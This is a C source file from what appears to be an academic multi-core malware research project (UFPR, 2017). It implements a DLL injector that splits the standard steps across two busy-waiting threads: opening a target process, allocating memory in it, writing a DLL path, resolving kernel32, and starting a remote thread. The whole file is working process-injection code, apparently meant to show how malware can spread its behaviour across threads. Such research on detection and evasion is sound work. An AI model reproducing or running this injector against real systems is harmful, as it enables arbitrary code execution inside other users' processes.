/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

#include "../Parallel.Sync/threads.h"
#include <stdio.h>
#include "../Serial/functions.h"

DWORD WINAPI T1( LPVOID lpParam )
{
	pcontext ctx = (pcontext)lpParam;

	printf("1. 1/6. OpenProc\n");
	ctx->proc = OPENPROC(ctx->pid);
	if(!ctx->proc)
	{
		printf("OpenProc error\n");
		exit(0);
	}

	ctx->busy1=FALSE;
	ctx->busy2=TRUE;

	while(ctx->busy2==TRUE);

	ctx->busy1=TRUE;

	printf("1. 3/6. WriteMemory\n");
	ctx->write = WRITEPROC( ctx->proc, ctx->alloc,ctx->dll, ctx->size);
	if(!ctx->write)
	{
		printf("WriteProcMem error\n");
		exit(0);
	}
	
	ctx->busy1=FALSE;
	ctx->busy2=TRUE;

	while(ctx->busy2==TRUE);

	ctx->busy1=TRUE;

	printf("1. 5/6. GetThreadStart\n");
	ctx->tStart = GetThreadStart(ctx->k32);
	if(!ctx->tStart)
	{
		printf("GetThreadStart error\n");
		exit(0);
	}
	
	ctx->busy1=FALSE;
	ctx->busy2=TRUE;

	return 0;
}

DWORD WINAPI T2( LPVOID lpParam )
{
	pcontext ctx = (pcontext)lpParam;
	
	while(ctx->busy1==TRUE);
	ctx->busy2=TRUE;
	
	printf("2. 2/6. VirtualAlloc\n");
	ctx->size= (strlen(ctx->dll)+1)*sizeof(char);
	ctx->alloc = VIRTUALALLOC(ctx->proc,ctx->size);
	if(!ctx->alloc)
	{
		printf("VirtualAlloc error\n");
		exit(0);
	}
	ctx->busy2=FALSE;
	ctx->busy1=TRUE;
	while(ctx->busy1==TRUE);
	ctx->busy2=TRUE;

	printf("2. 4/6. GetModule\n");
	ctx->k32 = GetModule();
	if(!ctx->k32)
	{
		printf("GetModule error\n");
		exit(0);
	}
	ctx->busy2=FALSE;
	ctx->busy1=TRUE;
	while(ctx->busy1==TRUE);
	ctx->busy2=TRUE;
	printf("2. 6/6. CreateThread\n");
	ctx->thread = CreateThread(ctx->proc,ctx->tStart,ctx->alloc);
	if(!ctx->thread)
	{
		printf("CreateThread error\n");
		exit(0);
	}

	return 0;
}